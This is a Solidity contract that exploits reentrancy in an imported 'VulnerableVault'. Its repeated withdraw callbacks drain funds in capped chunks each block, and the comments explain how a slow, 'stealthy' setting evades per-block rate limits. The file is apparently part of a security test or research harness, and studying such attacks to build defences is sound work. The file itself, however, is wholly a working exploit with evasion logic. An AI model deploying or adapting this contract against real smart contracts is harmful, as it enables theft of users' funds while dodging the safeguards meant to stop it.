// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VulnerableVault} from "./VulnerableVault.sol";

/// @title PatientReentrancyAttacker — an adaptive exploit with a tunable rate.
/// @notice Each `pulse()` (one per block) reenters `withdraw` to drain up to
///         `takePerBlock`, then stops. By draining a little each block over many
///         blocks, a patient attacker stays under a per-block rate limit and
///         evades it entirely. `takePerBlock` is the attacker's strategy knob:
///         large == fast/greedy (one-shot drain), small == slow/stealthy.
contract PatientReentrancyAttacker {
    VulnerableVault public immutable vault;
    uint256 public constant CHUNK = 1 ether;
    uint256 public immutable takePerBlock;
    uint256 internal takenThisBlock;

    constructor(VulnerableVault _vault, uint256 _takePerBlock) {
        vault = _vault;
        takePerBlock = _takePerBlock;
    }

    function seed() external payable {
        vault.deposit{value: msg.value}();
    }

    /// Drain up to `takePerBlock` within the current block (called once per block).
    function pulse() external {
        takenThisBlock = 0;
        _drain();
    }

    function _drain() internal {
        if (takenThisBlock + CHUNK <= takePerBlock && address(vault).balance >= CHUNK) {
            vault.withdraw(CHUNK);
        }
    }

    receive() external payable {
        takenThisBlock += CHUNK;
        _drain();
    }
}
